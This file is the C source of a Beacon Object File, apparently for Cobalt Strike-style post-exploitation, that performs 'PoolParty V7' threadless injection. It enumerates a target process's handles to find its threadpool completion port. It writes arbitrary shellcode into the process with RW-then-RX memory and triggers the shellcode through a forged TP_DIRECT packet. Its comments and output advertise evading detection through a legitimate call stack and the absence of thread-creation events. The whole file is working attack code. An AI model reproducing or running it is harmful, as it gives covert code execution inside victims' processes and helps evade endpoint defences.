/*
 * PoolParty V7 BOF — threadless injection into a remote process via the
 * TP_DIRECT fast-path: NtSetIoCompletionEx posts a completion packet whose
 * key is a remote TP_DIRECT structure to the target's threadpool IOCP. The
 * worker thread dispatches TppDirectpExecuteCallback -> our shellcode.
 *
 * Why V7 (course: PoolParty m7): simplest structure (+1 PVOID payload only),
 * no TP_POOL/queue LIST_ENTRY surgery (no build-offset risk), no thread
 * creation, fully legitimate call stack (TppDirectpExecuteCallback
 * <- TppWorkerThread <- BaseThreadInitThunk <- RtlUserThreadStart).
 *
 * Flow:
 *   1. IoCompletion type index discovery WITHOUT NtQueryObject (hang-safe):
 *      count each object type in SystemHandleInformation (0x10) and
 *      SystemHandleExtendedInformation (0x40); the type whose counts differ
 *      is IoCompletion (the documented PoolParty trick). Same pass yields
 *      TpWorkerFactory (also differs). Verified on W10/W11; if the counts
 *      are ambiguous the BOF aborts rather than guessing.
 *   2. Enumerate the target's handles; collect IoCompletion candidate
 *      entries (with their kernel OBJECT pointers) + TpWorkerFactory
 *      entries.
 *   3. Disambiguate the POOL IOCP: for each worker factory handle, query
 *      WorkerFactoryBasicInformation and scan the raw buffer for the IOCP's
 *      kernel object pointer (CompletionPort field) - exact match, no
 *      struct-offset assumptions.
 *   4. Allocate shellcode (RW -> write -> RX) + TP_DIRECT{Callback =
 *      shellcode} (RW, never executed) in the target.
 *   5. NtSetIoCompletionEx(dupIocp, dupIocp, pDirect, 0, 0, FALSE).
 *
 * Args (bof_pack): i=pid  b=payload(x64 shellcode)
 * x64 beacon only.
 */

#include <windows.h>
#include "beacon.h"
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)      ( ULONG, PVOID, ULONG, PULONG );
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)       ( HANDLE, PVOID *, ULONG, PSIZE_T, ULONG, ULONG );
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)        ( HANDLE, PVOID *, PSIZE_T, ULONG, PULONG );
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)          ( HANDLE, PVOID, VOID *, SIZE_T, PSIZE_T );
typedef NTSTATUS (NTAPI *pNtQueryInformationWorkerFactory)( HANDLE, ULONG, PVOID, ULONG, PULONG );

#define SystemHandleInformation            0x10
#define SystemHandleExtendedInformation    0x40
#define WorkerFactoryBasicInformation      0

#define MAX_TYPES 1024

/* 16-byte x64 entry (SystemHandleInformation, 0x10) */
typedef struct _SHENTRY {
    USHORT ProcId;
    BYTE   Type;
    BYTE   Attr;
    USHORT Handle;
    PVOID  Object;
    ULONG  Access;
} SHENTRY;

/* 32-byte x64 entry (SystemHandleExtendedInformation, 0x40) */
typedef struct _SHEXENTRY {
    PVOID  Object;
    ULONG  ProcId;
    ULONG  Handle;
    ULONG  Access;
    USHORT CreatorBackTrace;
    USHORT TypeIndex;
    ULONG  Attributes;
    ULONG  Reserved;
} SHEXENTRY;

typedef struct _SHINFO {
    ULONG Count;
    /* entries follow */
} SHINFO;

/* imports */
WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess( DWORD, BOOL, DWORD );
WINBASEAPI BOOL WINAPI    KERNEL32$CloseHandle( HANDLE );
WINBASEAPI DWORD WINAPI   KERNEL32$GetLastError( VOID );
WINBASEAPI LPVOID WINAPI  KERNEL32$HeapAlloc( HANDLE, DWORD, SIZE_T );
WINBASEAPI BOOL WINAPI    KERNEL32$HeapFree( HANDLE, DWORD, PVOID );
WINBASEAPI HANDLE WINAPI  KERNEL32$GetProcessHeap( VOID );
WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle( HANDLE, HANDLE, HANDLE, HANDLE *, DWORD, BOOL, DWORD );
WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess( VOID );

__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory( HANDLE, PVOID *, ULONG, PSIZE_T, ULONG, ULONG );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory( HANDLE, PVOID *, PSIZE_T, ULONG, PULONG );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory( HANDLE, PVOID, VOID *, SIZE_T, PSIZE_T );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtQuerySystemInformation( ULONG, PVOID, ULONG, PULONG );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtQueryInformationWorkerFactory( HANDLE, ULONG, PVOID, ULONG, PULONG );
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtSetIoCompletionEx( HANDLE, HANDLE, PVOID, LONG, ULONG_PTR, BOOLEAN );

static BYTE * GrowQuery( pNtQuerySystemInformation pQsi, ULONG cls, ULONG * outLen ) {
    ULONG len = 0x1000;
    for ( int tries = 0; tries < 3; tries++ ) {
        BYTE * buf = (BYTE *)KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), 0, len );
        if ( ! buf ) return NULL;
        NTSTATUS st = pQsi( cls, buf, len, &len );
        if ( st == 0 ) { *outLen = len; return buf; }
        KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, buf );
        len = (ULONG)( len * 2 );
        if ( st != 0xC0000004 /* STATUS_INFO_LENGTH_MISMATCH */ ) break;
    }
    return NULL;
}

/* Discover the IoCompletion + TpWorkerFactory type indices via count-diff */
static BOOL DiscoverTypeIndices( pNtQuerySystemInformation pQsi, BYTE * iocpIdx, BYTE * wfIdx ) {
    ULONG len1 = 0, len2 = 0;
    BYTE * v1 = GrowQuery( pQsi, SystemHandleInformation, &len1 );
    BYTE * v2 = GrowQuery( pQsi, SystemHandleExtendedInformation, &len2 );
    if ( ! v1 || ! v2 ) { if (v1) KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, v1 );
                          if (v2) KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, v2 ); return FALSE; }

    ULONG c1[ MAX_TYPES ]; ULONG c2[ MAX_TYPES ];
    for ( int i = 0; i < MAX_TYPES; i++ ) { c1[i] = 0; c2[i] = 0; }

    ULONG n1 = *(ULONG *)v1;
    SHENTRY * e1 = (SHENTRY *)( v1 + 4 );
    for ( ULONG i = 0; i < n1; i++ )
        if ( e1[i].Type < MAX_TYPES ) c1[ e1[i].Type ]++;

    ULONG n2 = *(ULONG *)v2;
    SHEXENTRY * e2 = (SHEXENTRY *)( v2 + 4 );
    for ( ULONG i = 0; i < n2; i++ )
        if ( e2[i].TypeIndex < MAX_TYPES ) c2[ e2[i].TypeIndex ]++;

    ULONG diffIdx[8]; ULONG nDiff = 0;
    for ( ULONG i = 1; i < MAX_TYPES; i++ ) {
        if ( c1[i] + c2[i] < 8 ) continue;
        if ( c1[i] != c2[i] ) {
            if ( nDiff < 8 ) diffIdx[ nDiff++ ] = i;
        }
    }

    ULONG found = 0;
    if ( nDiff >= 1 ) { *iocpIdx = (BYTE)diffIdx[0]; found++; }   /* first diff = IoCompletion */
    if ( nDiff >= 2 ) { *wfIdx   = (BYTE)diffIdx[1]; found++; }   /* second = TpWorkerFactory  */

    KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, v1 );
    KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, v2 );

    /* sanity: the classic layout is exactly these two differing types */
    return ( nDiff == 2 );
}

/* dump a target handle via duplication (both directions) */
static HANDLE DupTargetHandle( HANDLE hProc, USHORT hVal ) {
    HANDLE dupd = NULL;
    KERNEL32$DuplicateHandle( hProc, (HANDLE)(ULONG_PTR)(ULONG)hVal,
                              KERNEL32$GetCurrentProcess(), &dupd, 0, FALSE, 2 /*DUPLICATE_SAME_ACCESS*/ );
    return dupd;
}

static BOOL QueryWfCompletionPort( pNtQueryInformationWorkerFactory pQwf, HANDLE hWf, PVOID objPtr ) {
    BYTE buf[ 0x400 ];
    ULONG ret = 0;
    for ( int i = 0; i < (int)sizeof( buf ); i++ ) buf[i] = 0;
    if ( pQwf( hWf, WorkerFactoryBasicInformation, buf, sizeof( buf ), &ret ) != 0 )
        return FALSE;
    /* scan for the 8-byte kernel object pointer (CompletionPort) */
    for ( ULONG i = 0; i + 8 <= ret; i += 8 )
        if ( *(PVOID *)( buf + i ) == objPtr )
            return TRUE;
    return FALSE;
}

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
void go( char * args, int alen ) {
#if defined(WOW64)
    (void)args; (void)alen;
    BeaconPrintf( CALLBACK_ERROR, "poolpartyv7: x64 only" );
#else
    datap parser;
    BeaconDataParse( &parser, args, alen );

    int   pid     = BeaconDataInt( &parser );
    int   scLen   = BeaconDataLength( &parser );
    char * scData = BeaconDataExtract( &parser, 0 );

    if ( pid <= 0 || !scData || scLen <= 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "usage: poolpartyv7 <pid> <shellcode>" );
        return;
    }
    if ( scLen > 0x10000 ) {
        BeaconPrintf( CALLBACK_ERROR, "payload too large (%d)", scLen );
        return;
    }

    pNtAllocateVirtualMemory        pAlloc = (pNtAllocateVirtualMemory)        NTDLL$NtAllocateVirtualMemory;
    pNtProtectVirtualMemory         pProt  = (pNtProtectVirtualMemory)         NTDLL$NtProtectVirtualMemory;
    pNtWriteVirtualMemory           pWrite = (pNtWriteVirtualMemory)           NTDLL$NtWriteVirtualMemory;
    pNtQuerySystemInformation       pQsi   = (pNtQuerySystemInformation)       NTDLL$NtQuerySystemInformation;
    pNtQueryInformationWorkerFactory pQwf  = (pNtQueryInformationWorkerFactory) NTDLL$NtQueryInformationWorkerFactory;
    (void)pAlloc; (void)pProt; (void)pWrite; (void)pQsi; (void)pQwf;

    BYTE iocpIdx = 0, wfIdx = 0;
    if ( ! DiscoverTypeIndices( pQsi, &iocpIdx, &wfIdx ) ) {
        BeaconPrintf( CALLBACK_ERROR, "type-index discovery ambiguous (IoCompletion=%d TpWorkerFactory=%d) - aborting", iocpIdx, wfIdx );
        return;
    }

    /* extended handle snapshot: pick this pid's candidates */
    ULONG snapLen = 0;
    BYTE * snap = GrowQuery( pQsi, SystemHandleExtendedInformation, &snapLen );
    if ( ! snap ) {
        BeaconPrintf( CALLBACK_ERROR, "handle enumeration failed" );
        return;
    }
    ULONG n = *(ULONG *)snap;
    SHEXENTRY * ents = (SHEXENTRY *)( snap + 4 );

    USHORT iocpCandidates[ 64 ]; PVOID iocpObjects[ 64 ]; ULONG nIocp = 0;
    USHORT wfCandidates[ 32 ];   PVOID wfObjects[ 32 ];   ULONG nWf = 0;

    for ( ULONG i = 0; i < n && nIocp < 64; i++ ) {
        if ( (LONG)ents[i].ProcId != pid ) continue;
        if ( ents[i].TypeIndex == iocpIdx && nIocp < 64 ) {
            iocpCandidates[ nIocp ] = ents[i].Handle;
            iocpObjects[ nIocp ]    = ents[i].Object;
            nIocp++;
        }
        if ( ents[i].TypeIndex == wfIdx && nWf < 32 )
            wfCandidates[ nWf++ ] = ents[i].Handle;
    }

    if ( ! nIocp ) {
        KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, snap );
        BeaconPrintf( CALLBACK_ERROR, "pid %d has no IoCompletion handles", pid );
        return;
    }

    HANDLE hProc = KERNEL32$OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE, FALSE, (DWORD)pid );
    if ( ! hProc ) {
        KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, snap );
        BeaconPrintf( CALLBACK_ERROR, "OpenProcess(%d) failed (err %d)", pid, (int)KERNEL32$GetLastError() );
        return;
    }

    /* pool-IOCP disambiguation via worker factories */
    ULONG picked = 0;
    if ( nWf ) {
        for ( ULONG w = 0; w < nWf && !picked; w++ ) {
            HANDLE hWf = DupTargetHandle( hProc, wfCandidates[w] );
            if ( ! hWf ) continue;
            for ( ULONG c = 0; c < nIocp && !picked; c++ ) {
                if ( ( (ULONG_PTR)iocpObjects[c] & 0xFFF0000000000000ull ) != 0xFFFF000000000000ull ) continue; /* kernel-ptr shape */
                if ( QueryWfCompletionPort( pQwf, hWf, iocpObjects[c] ) )
                    picked = c + 1;
            }
            KERNEL32$CloseHandle( hWf );
        }
    }
    if ( ! picked )
        picked = 1;   /* fall back: first IOCP candidate */

    ULONG c = picked - 1;
    HANDLE hIocp = DupTargetHandle( hProc, iocpCandidates[c] );
    KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, snap );
    if ( ! hIocp ) {
        BeaconPrintf( CALLBACK_ERROR, "DuplicateHandle on pool IOCP failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }

    /* shellcode: RW -> write -> RX */
    PVOID pSc = NULL; SIZE_T scSz = ( (ULONG)scLen + 0xFFF ) & ~0xFFFul;
    if ( pAlloc( hProc, &pSc, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) != 0 || ! pSc ) {
        BeaconPrintf( CALLBACK_ERROR, "remote shellcode alloc failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }
    SIZE_T wgot = 0;
    if ( pWrite( hProc, pSc, scData, (SIZE_T)scLen, &wgot ) != 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "remote shellcode write failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }
    {
        PVOID pb = pSc; SIZE_T ps = scSz; ULONG oldp = 0;
        if ( pProt( hProc, &pb, &ps, PAGE_EXECUTE_READ, &oldp ) != 0 ) {
            BeaconPrintf( CALLBACK_ERROR, "shellcode RX protect failed" );
            KERNEL32$CloseHandle( hProc );
            return;
        }
    }

    /* TP_DIRECT { PVOID Callback; } - never executed, stays RW */
    PVOID pDir = NULL; SIZE_T dirSz = 0x1000;
    if ( pAlloc( hProc, &pDir, 0, &dirSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) != 0 || ! pDir ) {
        BeaconPrintf( CALLBACK_ERROR, "remote TP_DIRECT alloc failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }
    PVOID cb = pSc;
    if ( pWrite( hProc, pDir, &cb, sizeof( cb ), &wgot ) != 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "TP_DIRECT write failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }

    /* fire: IOCP-post only. The key IS the TP_DIRECT pointer - TppDirect-
       pExecuteCallback dispatches straight from the packet. */
    NTSTATUS st = NTDLL$NtSetIoCompletionEx( hIocp, hIocp, pDir, 0, 0, FALSE );
    if ( st == 0 )
        BeaconPrintf( CALLBACK_OUTPUT,
            "[+] TP_DIRECT posted: pid %d, iocp h=%p (obj %p, candidate %d of %d), shellcode %d bytes @ %p\n"
            "[*] execution = next pool work dispatch (TppDirectpExecuteCallback). No thread creation events.",
            pid, (HANDLE)(ULONG_PTR)(ULONG)iocpCandidates[c], iocpObjects[c], c + 1, nIocp, scLen, pSc );
    else
        BeaconPrintf( CALLBACK_ERROR, "NtSetIoCompletionEx failed: 0x%08x", (unsigned)st );

    KERNEL32$CloseHandle( hIocp );
    KERNEL32$CloseHandle( hProc );
#endif
}
#pragma GCC diagnostic pop
